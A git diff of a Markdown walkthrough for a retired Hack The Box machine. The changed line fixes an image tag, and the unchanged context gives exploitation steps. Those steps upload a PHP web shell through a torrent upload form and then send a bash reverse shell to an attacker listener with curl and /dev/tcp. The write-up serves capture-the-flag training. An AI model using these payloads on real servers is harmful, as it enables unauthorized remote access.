@@ -26,7 +26,7 @@ Retired Medium Machine by ch4p
 ## Exploitation
 
 1. After loggin in we can use the upload option. During uploading torrent file, we can modify filename and filecontent to php shell code with burp suite or OWASP ZAP.
-<img src="./img/4b.png?raw=true" width="80%" alt="Burp"></li>
+<img src="./img/4b.png?raw=true" width="80%" alt="Burp">
 2. We can goto `/torrent/upload` directory to get our file and simple `curl http://10.10.10.6/torrent/upload/3like1share3folllow3subscribe7.php?test=whoami` will execute command on the server.
 3. Running netcat client on host with `nc -lvnp 1337` and command `curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php --data-urlencode "test=bash -c 'bash -i >& /dev/tcp/10.10.14.100/1337 0>&1'"` will give us shell as user `www-data`.
 4. Now we can simply get `user.txt` as `www-data` for user `george` with command `cat /home/george/user.txt`.
